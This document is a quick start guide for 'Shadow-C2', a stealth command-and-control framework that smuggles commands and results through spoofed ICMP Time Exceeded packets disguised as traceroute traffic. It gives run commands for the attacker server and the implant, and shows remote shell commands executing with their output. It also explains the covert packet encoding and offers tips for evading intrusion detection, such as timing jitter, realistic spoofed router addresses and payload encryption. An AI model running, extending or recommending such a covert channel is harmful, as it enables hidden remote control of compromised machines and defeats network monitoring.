# Shadow-C2 - Quick Start Guide

## One-Minute Overview

**Shadow-C2** is a stealth C2 framework that disguises commands and results as traceroute traffic using spoofed ICMP Time Exceeded packets.

- **Server**: Queues commands, sends via Type 11 Time Exceeded (512B chunks)
- **Client**: Mimics traceroute, receives commands, executes, returns results (2B chunks)
- **Stealth**: Traffic appears as failed traceroute; IDS sees legitimate ICMP errors only

---

## Installation

### Requirements
```bash
# System
sudo  # must run as root

# Python
python3 3.8+

# Libraries
pip install scapy
```

### Setup
```bash
# Copy server and client to accessible locations
cp server.py /path/to/attacker/
cp client.py /path/to/client/
```

---

## Usage

### Terminal 1: Start Server (Attacker)

```bash
sudo python3 server.py 192.168.1.100
```

**Output:**
```
Shadow-C2 Server
  Server IP      : 192.168.1.100
  Spoof IP range : 192.168.1.101 ~ (+1 per chunk)
  Magic ICMP ID  : 0x5354
  ...

=== Shadow-C2 Server CLI ===
Type a command and press Enter -> sent on client's next poll
  'stats'  : show statistics
  'queue'  : show command queue
  'clear'  : clear command queue
  'exit'   : quit

C2>
```

### Terminal 2: Start Client (Implant)

```bash
sudo python3 client.py 192.168.1.100 5
```

**Output:**
```
Shadow-C2 Implant (Client)
  C2 Server      : 192.168.1.100
  Poll interval  : 5s
  ...

[SES] Session #1 -> 192.168.1.100
[TRACE] Phase 1: Real traceroute probes TTL 1~4 (3 probes/TTL)
[TRACE]   TTL= 1  192.168.1.1  (TimeExceeded)  3/3 responses
[TRACE]   TTL= 2  192.168.1.2  (TimeExceeded)  3/3 responses
[TRACE]   TTL= 3  192.168.1.3  (TimeExceeded)  3/3 responses
[TRACE]   TTL= 4  192.168.1.4  (TimeExceeded)  3/3 responses
[TRACE] Phase 2: C2 intervention (3 probes/TTL, sniff-first)
```

### Terminal 1 (Server CLI): Queue a Command

```bash
C2> whoami
[CLI] Queued: 'whoami'

C2> id
[CLI] Queued: 'id'
```

### Terminal 2 (Client): Receives and Executes

The client polls every 5 seconds. It will:

1. **Phase 2**: Receive command chunks from server
2. **Phase 3**: Execute locally
3. **Phase 4**: Send result back

**Example output (after ~10 seconds):**
```
[TRACE] Command assembled (6B): whoami
[EXEC] Executing: whoami
──────────────────────────────────────
root
──────────────────────────────────────
[TX] Sending result (4B -> 2 chunks + 1 padding -> 1 TTL hops x 3) -> 192.168.1.100

[SES] Session #1 complete.
[WAIT] Next session in 5s ...
```

### Terminal 1 (Server): See Result

```
============================================================
[RESULT from 192.168.1.100]
============================================================
root
============================================================

C2>
```

---

## Command Examples

### Simple Commands

```bash
C2> whoami
C2> id
C2> pwd
C2> ls -la /tmp
C2> cat /etc/hostname
```

### Shell Execution

```bash
C2> echo "test" > /tmp/pwned.txt
C2> ls /tmp/pwned.txt
```

### Multiple Commands

Queue multiple commands; the client processes them in order:

```bash
C2> uname -a
C2> ip addr
C2> ps aux
C2> [wait for results...]
```

### Statistics

```bash
C2> stats
  TX packets : 15
  RX packets : 45
  Sessions   : 1
```

---

## How It Works

### Phase 1: Real Traceroute (TTL 1-4)
- Client sends normal Echo Requests with TTL=1, 2, 3, 4
- Real routers respond with Time Exceeded
- **Appearance**: Normal traceroute in progress

### Phase 2: C2 Command Delivery (TTL 5+)
- Client continues sending Echo Requests (TTL 5, 6, 7, ...)
- **Server responds** with spoofed Time Exceeded packets
- **Spoof IPs**: 192.168.1.101, 192.168.1.102, 192.168.1.103, ... (appear as "additional routers")
- **Data**: Command is embedded in Type 11 inner IP header + payload (512 bytes/packet max)
- **Client**: Extracts command from Time Exceeded inner payload

### Phase 3: Command Execution
- Client executes command locally
- Collects output

### Phase 4: Result Upload (TTL resumes from command count)
- Client sends Echo Requests with **ICMP sequence number as data carrier**
- Each packet carries 2 bytes of result (from ICMP.seq field)
- Server receives all probes and reconstructs result
- Final probe gets Echo Reply from server (traceroute completion)

---

## Packet Structure

### Downstream (Type 11 Time Exceeded)

```
Outer: IP(src=192.168.1.101, dst=client) / ICMP(type=11)
Inner: IP(src=192.168.1.100, dst=client) / ICMP(type=8) / Data(command)

IP.id metadata: [Session: 4bit][ChunkIdx: 10bit][Flag: 2bit]
  Session=1, ChunkIdx=0, Flag=DATA (0x1000 = 0x1000)
```

### Upstream (Echo Request)

```
IP(src=client, dst=192.168.1.100, ttl=N+M+1, id=0x1007)
  / ICMP(type=8, id=0x5354, seq=0xABCD)  <- seq carries 2 bytes of result
  / Raw(ICMP_PAYLOAD)                     <- fixed ping pattern
```

---

## Monitoring Traffic

### What Legitimate IDS Sees

```
Client -> Router1: Echo Request TTL=1
Router1 -> Client: Time Exceeded

Client -> Router2: Echo Request TTL=2
Router2 -> Client: Time Exceeded

...

Client -> Server: Echo Request TTL=5 (no response expected)
Server -> Client: Time Exceeded (appears from router 5)
```

**Interpretation**: "Traceroute in progress, path ends at hop 4. Additional probes (TTL 5+) get ICMP errors from intermediate routers."

### Deep Inspection (tcpdump)

```bash
# See all ICMP on network
sudo tcpdump -i eth0 'icmp' -v

# Just Type 11 (Time Exceeded)
sudo tcpdump -i eth0 'icmp[0]=11' -v

# Specific source
sudo tcpdump -i eth0 'icmp and src 192.168.1.101' -v
```

### Payload Inspection

```bash
# See Time Exceeded inner payload hex
sudo tcpdump -i eth0 'icmp[0]=11' -X
```

---

## Troubleshooting

### Client doesn't receive command

**Symptom**: `[TRACE] Chunk 0 timeout. Aborting session.`

**Cause**: Server not running or firewall blocking Type 11

**Fix**:
1. Verify server is running: `ps aux | grep server.py`
2. Check routing: `ping -I <interface> 192.168.1.100`
3. Check firewall: `sudo iptables -L -n | grep ICMP` (should allow Type 11)

### Server doesn't see client probes

**Symptom**: Server outputs nothing when client starts

**Cause**: Client probes not reaching server

**Fix**:
1. Verify networks are connected: `ip route show`
2. Check client IP: `ip addr show` (should be in same network as server)
3. Run tcpdump on server to see if probes arrive:
   ```bash
   sudo tcpdump -i eth0 'icmp and icmp[0]=8' -v
   ```

### "Must run as root"

**Fix**: Always use `sudo`
```bash
sudo python3 server.py 192.168.1.100
sudo python3 client.py 192.168.1.100 5
```

---

## Performance Notes

| Metric | Value | Note |
|--------|-------|------|
| Downstream bandwidth | 512 B/probe | Command data |
| Upstream bandwidth | 2 B/probe | Result data (ICMP.seq) |
| Amplification | 256:1 | Asymmetric channel |
| Probes/TTL | 3 | Mimics real traceroute |
| Command latency | ~1 sec/command | 5 chunks × 200ms per chunk |
| Result latency | ~10 sec/100B | 50 chunks × 200ms |

---

## Security Considerations

✅ **Advantages**
- Outer packets (Type 11) look like real router responses
- No DNS/HTTP/suspicious TCP traffic
- Massive bandwidth amplification (256x downstream)
- Mimics common network diagnostic tool (traceroute)

⚠️ **Limitations**
- Timing patterns reveal automation (every 5 seconds)
- Spoofed router IPs may not match real topology (geoIP mismatch)
- No encryption (use inner payload encoding if needed)
- No retransmission (single probe loss = chunk miss)

### Mitigations
- Randomize poll interval (5s + random jitter)
- Use realistic spoofed IP range matching actual network topology
- Add simple XOR/Caesar cipher to inner payload
- Implement selective retransmission on timeout

---

## Advanced Customization

### Change Chunk Size

Edit `server.py`, line ~57:
```python
INNER_CHUNK_SIZE = 512  # Default: 512 bytes/chunk
```

Smaller = more probes per command (slower, stealthier)
Larger = fewer probes (faster, more detectable)

### Change Poll Interval

```bash
sudo python3 client.py 192.168.1.100 10  # Poll every 10 seconds
```

### Change Probes Per TTL

Edit client.py, line ~63:
```python
PROBES_PER_TTL = 3  # Default: 3 (matches real traceroute)
```

Real traceroute uses 3 probes per TTL; changing this breaks mimicry.

---

## Testing in Docker Lab

```bash
# Terminal 1: Server in attacker container
docker exec -u root attacker sudo python3 /path/to/server.py 172.30.2.10

# Terminal 2: Client in client container
docker exec -u root client sudo python3 /path/to/client.py 172.30.2.10 5

# Terminal 3: Monitor traffic on relay
docker exec -u root relay sudo tcpdump -i eth0 'icmp' -v
docker exec -u root relay sudo tcpdump -i eth1 'icmp' -v
```

---

## Next Steps

- **Customize**: Edit chunk size, poll interval, spoofed IP range
- **Obfuscate**: Add encryption to inner payload
- **Scale**: Implement load balancing across multiple servers
- **Defend**: Study detection methods and implement countermeasures

---

## References

- RFC 792: ICMP Protocol Spec
- Scapy Documentation: https://scapy.readthedocs.io/
- Traceroute Man Pages
